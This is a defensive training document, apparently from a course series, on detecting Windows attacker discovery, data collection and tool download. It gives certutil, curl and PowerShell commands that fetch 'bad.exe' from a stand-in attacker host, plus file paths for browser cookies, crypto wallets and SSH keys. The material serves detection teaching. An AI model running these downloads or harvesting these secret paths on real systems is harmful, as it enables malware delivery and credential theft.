# Windows Threat Detection Series — Part 2: Situational Awareness, Collection & Ingress Tool Transfer

## 1. Situational Awareness & Discovery

Once threat actors successfully breach a perimeter (Initial Access), they must map out their environment. This process maps to the **MITRE Discovery** tactic and helps attackers identify target value, user roles, system configurations, and active security controls (such as installed antivirus products).

### Common Discovery Commands & Purposes

| Category | Purpose | Common CMD / PowerShell Commands |
| :--- | :--- | :--- |
| **Files & Folders** | Determine host purpose or user interests | `type`, `Get-Content`, `dir`, `Get-ChildItem` |
| **Users & Groups** | Identify current privileges and users | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` |
| **System & Apps** | Find vulnerabilities or target apps | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` |
| **Network Settings** | Check for corporate network integration | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` |
| **Active Antivirus** | Assess risk of detection | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

### Execution Methods: CMD vs. GUI
* **Discovery via CMD:** Relies on native binaries. Leaves clear process creation logs (`Sysmon Event ID 1`).
  * *Example Process Tree:* `invoice.pdf.exe` ➔ `cmd.exe` ➔ (`ipconfig`, `whoami /priv`, `net user`, etc.)
* **Discovery via GUI:** Used during interactive sessions (e.g., post-RDP breach) where attackers leverage native OS utilities, management consoles (`mmc.exe compmgmt.msc`), control panels, or Task Manager (`taskmgr.exe`).

> [!NOTE]
> Discovery commands are often executed immediately upon malware launch to perform environmental checks (e.g., verifying if the victim belongs to a target country or organization before deploying further payloads).

---

## 2. Searching Secrets (Collection & Exfiltration)

Once attackers understand the layout of the environment, they transition to targeting assets of high value. This involves **Collection**, **Credential Access**, and **Exfiltration**.

### Collection Targets by Attack Goal
* **Blackmail / Personal Info:** Chats, browser history, images
  * `C:\Users\<user>\AppData\Roaming\Signal\*`
  * `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History`
* **Financial Theft:** Web banking sessions, crypto wallets
  * `C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat`
  * `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies`
* **Corporate Espionage:** Databases, SSH keys
  * `C:\Users\<user>\.ssh\*`
  * `C:\Program Files\Microsoft SQL Server\...\DATA\*`

### Manual Collection vs. Data Stealers
* **Human-Driven Collection:** Manual searching using utilities like `Notepad`, `Wordpad`, `type`, or archiving tools like `7-Zip` (`7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*`) to package files.
* **Data Stealers:** Specialized automated malware (e.g., Gremlin data stealer) that programmatically harvests crypto wallets, VPN profiles, browser sessions, and communications data without issuing standard CMD/PowerShell prompts.

### Data Exfiltration Tactics
Attackers exfiltrate stolen data to command-and-control (C2) servers or trusted cloud storage providers to blend in with normal web traffic:
* Cloud storage (Dropbox, Mega, Amazon S3)
* Code repositories and messaging platforms (GitHub, Telegram)
* Custom domain masquerading (e.g., `windows-updates.com`)

---

## 3. Ingress Tool Transfer

Attackers rarely carry all necessary payloads in their initial phishing attachment or entry vector. Instead, they download additional binaries and utilities post-compromise—a technique mapped to **MITRE Ingress Tool Transfer**. This helps bypass initial perimeter security and minimizes exposure of advanced tooling.

### Common Tool Transfer Mechanisms
* **Certutil:** `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`
* **Curl (Windows 10+):** `curl.exe https://blackhat.thm/bad.exe -o good.exe`
* **PowerShell IWR:** `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`
* **GUI / RDP:** Direct copy-pasting or downloading via native web browsers.

### Detection Strategy
* Correlate network connections and DNS requests originating from unexpected parent processes.
* Beware of threat actors leveraging legitimate platforms (such as GitHub or cloud hosting services) to host secondary malware payloads.
